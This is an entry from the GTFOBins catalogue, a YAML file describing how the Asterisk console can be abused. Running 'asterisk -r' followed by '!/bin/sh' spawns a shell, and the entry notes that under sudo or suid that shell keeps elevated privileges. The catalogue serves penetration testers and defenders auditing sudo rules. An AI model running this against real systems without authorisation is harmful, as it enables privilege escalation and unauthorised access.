<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/asterisk -->
---
functions:
  shell:
  - code: |-
      asterisk -r
      !/bin/sh
    comment: |-
      A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
